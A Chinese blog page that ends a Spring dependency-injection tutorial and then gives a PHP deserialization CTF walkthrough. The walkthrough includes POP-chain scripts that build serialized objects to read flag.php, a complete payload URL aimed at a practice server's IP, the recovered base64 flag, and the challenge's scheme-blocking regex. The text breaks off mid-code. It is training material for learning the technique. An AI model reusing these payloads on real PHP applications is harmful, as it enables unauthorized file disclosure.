&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2，启动类实现代码：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //1，获取Spring上下文</span><br><span class="line">        ApplicationContext applicationContext =</span><br><span class="line">                new ClassPathXmlApplicationContext(<span class="string">&quot;spring-config.xml&quot;</span>);</span><br><span class="line">        //2,得到Bean对象</span><br><span class="line">        StudentController studentController =</span><br><span class="line">                applicationContext.getBean(<span class="string">&quot;studentController&quot;</span>,StudentController.class);</span><br><span class="line">        //3,使用Bean对象</span><br><span class="line">        studentController.sayHi();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3，启动类执行结果：</strong></p>
<p><img src="/.com//image-20250519113413-r3ei7ob.png" alt="image"></p>
<hr>
<h3 id="二，方式的优缺点分析"><a href="#二，方式的优缺点分析" class="headerlink" title="二，方式的优缺点分析"></a>二，方式的优缺点分析</h3><h4 id="2-1，属性注入"><a href="#2-1，属性注入" class="headerlink" title="2.1，属性注入"></a>2.1，属性注入</h4><p><strong>1，方式实现代码：</strong></p>
<p><img src="/.com//image-20250519113909-9naesmp.png" alt="image"></p>
<p><strong>2，方式优点：</strong></p>
<ul>
<li>实现简单，易于理解和维护</li>
</ul>
<p><strong>3，方式缺点：</strong></p>
<ul>
<li>不能注入不可变对象【final 修饰的变量】</li>
<li>通用性差，只适用于IoC容器，在非IoC框架中无效</li>
<li>更容易违背单一设计原则</li>
</ul>
<h4 id="2-2，Setter注入"><a href="#2-2，Setter注入" class="headerlink" title="2.2，Setter注入"></a>2.2，Setter注入</h4><p><strong>1，方式实现代码：</strong></p>
<p><img src="/.com//image-20250519114004-n40tgzk.png" alt="image"></p>
<p><strong>2，方式优点：</strong></p>
<ul>
<li>符合单一设计原则【每个方法只传递一个对象】</li>
</ul>
<p><strong>3，方式缺点：</strong></p>
<ul>
<li>不能注入不可变对象【final 修饰的变量】</li>
<li>使用Setter注入的对象可能被修改</li>
</ul>
<h4 id="2-3，构造方法注入"><a href="#2-3，构造方法注入" class="headerlink" title="2.3，构造方法注入"></a>2.3，构造方法注入</h4><p><strong>1，方式实现代码：</strong></p>
<p><img src="/.com//image-20250519114010-b66tqw9.png" alt="image"></p>
<p>注意：如果只有一个构造方法，那么 @Autowired 注解可以省略。</p>
<p><strong>2，方式优点：</strong></p>
<p>可以注入不可变对象【final 修饰的变量】</p>
<p>注入对象不会被改变【构造方法只执行一次】</p>
<p>注入对象会完全被初始化</p>
<p>通用性更好，可在IoC容器中使用，也可在非IoC中使用</p>
<p><strong>3，方式缺点：</strong></p>
<p>不符合单一设计原则【每个方法可传递多个对象】</p>
<hr>
<h3 id="三，对象注入中的问题"><a href="#三，对象注入中的问题" class="headerlink" title="三，对象注入中的问题"></a>三，对象注入中的问题</h3><h4 id="3-1，-Autowired-和-Resource"><a href="#3-1，-Autowired-和-Resource" class="headerlink" title="3.1，@Autowired 和 @Resource"></a>3.1，@Autowired 和 @Resource</h4><p>在进行类注入时，除了可以使用<code>@Autowired</code>​注解之外，我们还可以使用<code>@Resource</code>​注解进行注入。</p>
<p><img src="/.com//image-20250519114041-uhz25b2.png" alt="image"></p>
<p>​<code>@Autowired</code>​ 和 <code>@Resource</code>​ 都是在 <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Spring%20%E6%A1%86%E6%9E%B6&spm=1001.2101.3001.7020">Spring 框架</a>中用于注入依赖的注解，它们有以下区别：</p>
<ol>
<li><p><strong>来源不同：</strong></p>
<ul>
<li>​<code>@Autowired</code>​ 是 Spring 框架提供的注解，通过类型进行依赖注入。</li>
<li>​<code>@Resource</code>​ 是 JavaEE 定义的注解，通过名称进行依赖注入。</li>
</ul>
</li>
<li><p><strong>注入方式不同：</strong></p>
<ul>
<li>​<code>@Autowired</code>​ 默认按照类型匹配的方式进行注入，如果存在多个相同类型的实例，可以结合 <code>@Qualifier</code>​ 注解来指定具体实例。</li>
<li>​<code>@Resource</code>​ 默认按照名称匹配的方式进行注入，它支持使用 <code>name</code>​ 或 <code>type</code>​ 属性来指定名称或类型进行匹配。</li>
</ul>
</li>
<li><p><strong>支持的类型不同：</strong></p>
<ul>
<li>​<code>@Autowired</code>​ 支持通过构造方法注入、属性注入、Setter 注入的方式实现依赖注入。</li>
<li>​<code>@Resource</code>​ 支持通过属性注入、Setter 注入的方式实现依赖注入，不支持构造方法注入。</li>
</ul>
</li>
<li><p><strong>应用范围不同：</strong></p>
<ul>
<li>​<code>@Autowired</code>​ 主要用于 Spring 框架中的组件（如 Spring Bean）的依赖注入。</li>
<li>​<code>@Resource</code>​ 是 JavaEE 规范中的注解，它可以用于依赖注入和资源的获取，对于不依赖于 Spring 框架的应用也可以使用。</li>
</ul>
</li>
</ol>
<h4 id="3-2，同⼀类型多个-Bean-报错"><a href="#3-2，同⼀类型多个-Bean-报错" class="headerlink" title="3.2，同⼀类型多个 @Bean 报错"></a>3.2，同⼀类型多个 @Bean 报错</h4><p>当出现多个 Bean 返回同⼀对象类型时，程序会报错。解决同一个类型，多个bean的解决方案有以下两个：</p>
<p><strong>1，使用</strong>  <strong>​<code>@Resource(name=&quot;&quot;)</code>​</strong> ​</p>
<p><img src="/.com//image-20250519114126-lew7r0p.png" alt="image"></p>
<p><strong>2，搭配</strong>  <strong>​<code>@Autowired</code>​</strong>​ <strong>使用</strong>  <strong>​<code>@Qualifierr(value = &quot;&quot;)</code>​</strong> ​</p>
<p><img src="/.com//image-20250519114131-ekqswo4.png" alt="image"></p>
<p>核心总结<br>1，三种对象注入的实现方式以及优缺点？<br>属性注入，Setter注入和构造方法注入是在依赖注入中常用的三种方式，它们各有优缺点：</p>
<p>1，属性注入方式：其实现简单，易于理解和维护，但是其不能注入不可变对象，只适用于IoC容器，并且违反单一设计原则的概率大。</p>
<p>2，Setter注入方式：其符合单一设计原则，但是其不能注入不可变对象，并且使用Setter注入的对象可能被修改。</p>
<p>3，构造方法注入方式：其可以注入不可变对象，注入的对象不能被改变，保证注入对象完全被初始化，并且具有通用性，但是其不符合单一设计原则。</p>
<p>注意：在上述的三种对象注入的实现方式中，构造方法注入是Spring推荐的注入方式。</p>
<hr>
<p><strong>思考：为什么构造方法可以注入不可变变量，而属性注入和Setter注入却不行呢？</strong></p>
<p>解答：在 Java 中，被<code>final</code>​修饰的对象，要么直接进行赋值，要么就在构造方法中进行赋值，两种情况必须满足一个，否则方式报错。</p>
<hr>
<p>2，@Autowired 和 @Resource 注入注解的区别？<br>@Autowired 和 @Resource 都是在 Spring 框架中用于注入依赖的注解，它们有以下区别：</p>
<p>1，来源不同：@Autowired 是 Spring 框架提供的注解，而@Resource 是 JavaEE 定义的注解。</p>
<p>2，注入方式不同：@Autowired 默认按照类型匹配的方式进行注入，而@Resource 默认按照名称匹配的方式进行注入。</p>
<p>3，支持的类型不同：@Resource 支持通过属性注入、Setter 注入的方式实现依赖注入，不支持构造方法注入，而@Autowired 支持。</p>
<p>4，应用范围不同：@Autowired 主要用于 Spring 框架中的组件的依赖注入，而@Resource对于不依赖于 Spring 框架的应用也可使用。</p>
<hr>
<h4 id="3，同⼀类型多个-Bean-报错的解决方案有哪些？"><a href="#3，同⼀类型多个-Bean-报错的解决方案有哪些？" class="headerlink" title="3，同⼀类型多个 @Bean 报错的解决方案有哪些？"></a>3，同⼀类型多个 @Bean 报错的解决方案有哪些？</h4><p>解决同一个类型 @Bean 报错的解决方案有以下两个：</p>
<ol>
<li>使用 <code>@Resource(name=&quot;&quot;)</code>​</li>
<li>使用 <code>@Qualifierr(value = &quot;&quot;)</code>​ 【搭配@Autowired使用】</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" data-id="cmawczpot004hik7kgeut5gj5" data-title="反序列化对象注入" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Web/注入漏洞/反序列化/反序列化详解/题目练习" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/" class="article-date">
  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/">反序列化题目练习</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h1><h2 id="例题1："><a href="#例题1：" class="headerlink" title="例题1："></a>例题1：</h2><p><a target="_blank" rel="noopener" href="http://122.114.252.87:1110/index2.php">http://122.114.252.87:1110/index2.php</a></p>
<h4 id="解法1：-非预期解，手工调用"><a href="#解法1：-非预期解，手工调用" class="headerlink" title="解法1： 非预期解，手工调用"></a>解法1： 非预期解，手工调用</h4><p>第一步首先把网页上源代码复制下来 删除没用的 注释方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// public function get_file($value)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $text = base64_encode(file_get_contents($value));</span></span><br><span class="line">    <span class="comment">//     return $text;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class1</span>;</span><br><span class="line">    <span class="comment">// public function __construct($name=&#x27;index.php&#x27;)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;source = $name;</span></span><br><span class="line">    <span class="comment">//     echo $this-&gt;source.&#x27; Welcome&#x27;.&quot;&lt;br&gt;&quot;;    </span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">//关键点  会读取文件内容  我们的目标就是读取flag.php里面的内容</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;class1-&gt;<span class="title function_ invoke__">get_file</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="comment">//  因为get_file方法在Read中所有class1一定是Read的一个实例化对象</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// public function _show()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     if(preg_match(&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;,$this-&gt;source)) &#123;</span></span><br><span class="line">    <span class="comment">//         die(&#x27;hacker&#x27;);</span></span><br><span class="line">    <span class="comment">//     &#125; else &#123;</span></span><br><span class="line">    <span class="comment">//         highlight_file($this-&gt;source);</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// public function Change()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span></span><br><span class="line">    <span class="comment">//         echo &quot;hacker&quot;;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// public function __get($key)&#123;</span></span><br><span class="line">    <span class="comment">//     $function=$this-&gt;$key;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;&#123;$key&#125;();</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// if(isset($_GET[&#x27;sid&#x27;]))</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     $sid=$_GET[&#x27;sid&#x27;];</span></span><br><span class="line"><span class="comment">//     $config=unserialize($_GET[&#x27;config&#x27;]);</span></span><br><span class="line"><span class="comment">//     $config-&gt;$sid;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// else</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     $show = new Show(&#x27;index2.php&#x27;);</span></span><br><span class="line"><span class="comment">//     $show-&gt;_show();</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$s</span> -&gt; <span class="keyword">var</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="keyword">new</span> <span class="title class_">Read</span>();</span><br><span class="line"><span class="variable">$s</span> -&gt; class1 = <span class="variable">$r</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>)));</span><br></pre></td></tr></table></figure>

<p>非预期可以直接通过参数sid手动调用__toString方法而不是使用魔术方法 注意调用时不要加括号</p>
<p>输入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//122.114.252.87:1110/index2.php?config=O%3A4%3A%22Show%22%3A3%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22var%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A6%3A%22class1%22%3BO%3A4%3A%22Read%22%3A0%3A%7B%7D%7D&amp;sid=__toString</span></span><br></pre></td></tr></table></figure>

<p>得到base64编码的字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKJGZsYWcgPSAiZmxhZ3syNTZkN2ZkNi1kYjUxLTQ0YjktOGIyZC04OGUxN2IwODg2ZTl9IjsKPz4=</span><br></pre></td></tr></table></figure>

<p>进行解密</p>
<p><img src="/.com//17476536468948387717240924382119-20250519192047-ij0gmrz.png" alt="17476536468948387717240924382119"></p>
<p>成功得到flag！</p>
<h4 id="解法2：利用魔术方法调用-toString方法"><a href="#解法2：利用魔术方法调用-toString方法" class="headerlink" title="解法2：利用魔术方法调用__toString方法"></a>解法2：利用魔术方法调用__toString方法</h4><blockquote>
<p>__toString() 		   &#x2F;&#x2F;把类当作字符串使用时触发</p>
</blockquote>
<p>在正则表达式中把类当做了字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// public function get_file($value)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $text = base64_encode(file_get_contents($value));</span></span><br><span class="line">    <span class="comment">//     return $text;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class1</span>;</span><br><span class="line">    <span class="comment">// public function __construct($name=&#x27;index.php&#x27;)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;source = $name;</span></span><br><span class="line">    <span class="comment">//     echo $this-&gt;source.&#x27; Welcome&#x27;.&quot;&lt;br&gt;&quot;;    </span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">//关键点  会读取文件内容  我们的目标就是读取flag.php里面的内容</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;class1-&gt;<span class="title function_ invoke__">get_file</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="comment">//  因为get_file方法在Read中所有class1一定是Read的一个实例化对象</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// public function _show()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     if(preg_match(&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;,$this-&gt;source)) &#123;</span></span><br><span class="line">    <span class="comment">//         die(&#x27;hacker&#x27;);</span></span><br><span class="line">    <span class="comment">//     &#125; else &#123;</span></span><br><span class="line">    <span class="comment">//         highlight_file($this-&gt;source);</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// public function Change()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span></span><br><span class="line">    <span class="comment">//         echo &quot;hacker&quot;;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// public function __get($key)&#123;</span></span><br><span class="line">    <span class="comment">//     $function=$this-&gt;$key;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;&#123;$key&#125;();</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// if(isset($_GET[&#x27;sid&#x27;]))</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     $sid=$_GET[&#x27;sid&#x27;];</span></span><br><span class="line"><span class="comment">//     $config=unserialize($_GET[&#x27;config&#x27;]);</span></span><br><span class="line"><span class="comment">//     $config-&gt;$sid;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// else</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     $show = new Show(&#x27;index2.php&#x27;);</span></span><br><span class="line"><span class="comment">//     $show-&gt;_show();</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//倒着写的 这个是终点</span></span><br><span class="line"><span class="variable">$r</span> = <span class="keyword">new</span> <span class="title class_">Read</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$s</span> -&gt; <span class="keyword">var</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span> -&gt; class1 = <span class="variable">$r</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s2</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$s2</span> -&gt; source = <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$s2</span>)));  <span class="comment">//最后是对起点进行序列化</span></span><br></pre></td></tr></table></figure>

<p>一定要注意好&#x3D;&#x3D;s和s2&#x3D;&#x3D;的区别，首先肯定是对s2进行序列化 然后sid中执行字符串匹配的方法，</p>
<p>当通过&#x3D;&#x3D;s2去调用source&#x3D;&#x3D;的时候，因为source里面是&#x3D;&#x3D;类的对象&#x3D;&#x3D;，这个时候该&#x3D;&#x3D;对象也会执行&#x3D;&#x3D;，相当于去把&#x3D;&#x3D;s这个类对象&#x3D;&#x3D;，当做&#x3D;&#x3D;字符串去匹配正则表达式&#x3D;&#x3D;的时候，触发了&#x3D;&#x3D;s的toString方法&#x3D;&#x3D;，与&#x3D;&#x3D;s2没有关系，s2只是一个存放s的入口&#x3D;&#x3D;。</p>
<p>此外当sid为&#x3D;&#x3D;_show&#x3D;&#x3D;的时候会出现&#x3D;&#x3D;两次加密字符串&#x3D;&#x3D;是因为触发了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为$this -&gt; source的结果就是编码字符串</p>
<p>然后还有一进入正则表达式的方法时就调用了一次</p>
<p>所以一共显示了两次</p>
<p>解密后成功得到flag！</p>
<hr>
<h2 id="例题2："><a href="#例题2：" class="headerlink" title="例题2："></a>例题2：</h2><p><a target="_blank" rel="noopener" href="http://122.114.252.87:1110/index3.php">http://122.114.252.87:1110/index3.php</a></p>
<h6 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">index3.php You are in my range!</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vox</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$headset</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$sound</span>;</span><br><span class="line">    <span class="comment">//考虑fun函数作为最终的利用点</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$pulse</span></span>)</span>&#123;</span><br><span class="line">            <span class="comment">//include！！！！危险函数 文件包含 通过文件流 伪协议 base64 